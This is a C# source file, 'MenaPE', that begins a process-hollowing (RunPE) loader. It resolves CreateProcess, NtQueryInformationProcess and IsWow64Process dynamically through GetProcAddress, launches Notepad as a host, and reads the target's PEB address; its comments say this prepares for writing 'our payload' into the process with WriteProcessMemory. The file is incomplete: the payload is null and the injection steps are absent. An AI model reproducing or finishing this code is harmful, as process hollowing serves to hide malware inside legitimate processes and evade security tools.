    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.Data;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.IO;
    namespace MenaPE
    {
        class Program
        {
            static void Main(string[] args)
            {
                const uint NORMAL_PRIORITY_CLASS = 0x0020;
                string Application = Environment.GetEnvironmentVariable("windir") + @"\Notepad.exe";
                string CommandLine = @" c:\temp\test.txt";
                //PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
                //STARTUPINFO sInfo = new STARTUPINFO();
                //SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                //SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                //pSec.nLength = Marshal.SizeOf(pSec);
                //tSec.nLength = Marshal.SizeOf(tSec);
                byte[] payload = null;
                MenaPE menaPE = new MenaPE();
                menaPE.Run(Application, CommandLine, payload, NORMAL_PRIORITY_CLASS);
            }
        }
        public class MenaPE
        {
            [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr LoadLibraryA(string Name);
            [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr GetProcAddress(IntPtr hProcess, string Name);
            private static T CreateApi<T>(string Name, string Method)
            {
                return (T)(object)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(Name), Method), typeof(T));
            }
            private delegate bool CreateProcessParameters(string ApplicationName, string CommandLine, IntPtr ProcessAttributes, IntPtr ThreadAttributes, bool InheritHandles, uint CreationFlags, IntPtr Environment, string CurrentDirectory, ref STARTUPINFO StartupInfo, ref PROCESS_INFORMATION ProcessInformation);
            CreateProcessParameters CreateProcess = CreateApi<CreateProcessParameters>("kernel32", "CreateProcessA");
            private delegate uint NtQueryInformationProcessParameters(IntPtr hProcess, int ProcessInformationClass, IntPtr ProcessInformationptr, uint ProcessInformationLength, IntPtr ReturnLength);
            readonly NtQueryInformationProcessParameters NtQueryInformationProcess = CreateApi<NtQueryInformationProcessParameters>("ntdll", "NtQueryInformationProcess");
            private delegate bool IsWow64ProcessParameters(IntPtr hProcess, out bool Wow64Process);
            readonly IsWow64ProcessParameters IsWow64Process = CreateApi<IsWow64ProcessParameters>("kernel32", "IsWow64Process");
            private struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public uint dwProcessId;
                public uint dwThreadId;
            }
            private struct STARTUPINFO
            {
                public uint cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 36)]
                public byte[] Misc;
                public byte lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }
            public struct FLOATING_SAVE_AREA
            {
                public uint Control;
                public uint Status;
                public uint Tag;
                public uint ErrorO;
                public uint ErrorS;
                public uint DataO;
                public uint DataS;
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 80)]
                public byte[] RegisterArea;
                public uint State;
            }
            public struct CONTEXT32
            {
                public uint ContextFlags;
                public uint Dr0;
                public uint Dr1;
                public uint Dr2;
                public uint Dr3;
                public uint Dr6;
                public uint Dr7;
                public FLOATING_SAVE_AREA FloatSave;
                public uint SegGs;
                public uint SegFs;
                public uint SegEs;
                public uint SegDs;
                public uint Edi;
                public uint Esi;
                public uint Ebx;
                public uint Edx;
                public uint Ecx;
                public uint Eax;
                public uint Ebp;
                public uint Eip;
                public uint SegCs;
                public uint EFlags;
                public uint Esp;
                public uint SegSs;
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 512)]
                public byte[] ExtendedRegisters;
            }
            public struct PROCESS_BASIC_INFORMATION
            {
                public IntPtr ExitStatus;
                public IntPtr PebBaseAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniqueProcessID;
                public IntPtr InheritedFromUniqueProcessId;
            }
            public bool Run(string path, string QuotedPath, byte[] payload, uint creationflag)
            {
                for (int I = 1; I <= 5; I++)
                {
                    if (HandleRun(path, QuotedPath, payload, creationflag))
                        return true;
                }
                return false;
            }
            private bool HandleRun(string Path, string QuotedPath, byte[] payload, uint creationflag)
            {
                IntPtr nullPtr = IntPtr.Zero;
                uint ReadWrite = 0;
                STARTUPINFO SI = new STARTUPINFO();
                PROCESS_INFORMATION PI = new PROCESS_INFORMATION();
                SI.cb = Convert.ToUInt32(System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFO)));
                //Parses the size of the structure to the structure, so it retrieves the right size of data
                try
                {
                    //COMMENT: Creating a target process in suspended state, which makes it patch ready and we also retrieves its process information and startup information.
                    if (!CreateProcess(Path, QuotedPath, IntPtr.Zero, IntPtr.Zero, true, creationflag, IntPtr.Zero, Directory.GetCurrentDirectory(), ref SI, ref PI))
                        throw new Exception();
                    //COMMENT: Defines some variables we need in the next process
                    PROCESS_BASIC_INFORMATION ProccessInfo = new PROCESS_BASIC_INFORMATION();
                    IntPtr ProccessInfoptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(ProccessInfo));
                    IntPtr RetLength = IntPtr.Zero;
                    CONTEXT32 Context;
                    IntPtr PEBAddress32ptr =  IntPtr.Zero;
                    Int64? PEBAddress64 = null;
                    bool TargetIs64 = false;
                    bool IsWow64Proc = false;
                    IsWow64Process(PI.hProcess, out IsWow64Proc);
                    //COMMENT: Retrieves Boolean to know if target process is a 32bit process running in 32bit system, or a 32bit process running under WOW64 in a 64bit system.
                    //COMMENT: Checks the Boolean retrieved from before OR checks if our calling process is 32bit
                    if (IsWow64Proc | IntPtr.Size == 4)
                    {
                        Context = new CONTEXT32();
                        Context.ContextFlags = 0x1000002;
                        //COMMENT: Parses the context flag CONTEXT_AMD64(&H00100000L) + CONTEXT_INTEGER(0x00000002L) to tell that we want a structure of a 32bit process running under WOW64, you can see all context flags in winnt.h header file.
                        //COMMENT: Checks if our own process is 64bit and the target process is 32bit in wow64
                        if (IsWow64Proc && IntPtr.Size == 8)
                        {
                        }
                        else
                        {
                            uint query = NtQueryInformationProcess(PI.hProcess, 0, ProccessInfoptr, (uint)System.Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), RetLength);
                            //COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                            ProccessInfo = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(ProccessInfoptr, typeof(PROCESS_BASIC_INFORMATION));
                            PEBAddress32ptr = ProccessInfo.PebBaseAddress;
                            TargetIs64 = false;
                        }
                        //COMMENT: If our process is 64bit and the target process is 64bit we get here. 
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error : {0}", ex.Message);
                }
                return true;
            }
        }
    }
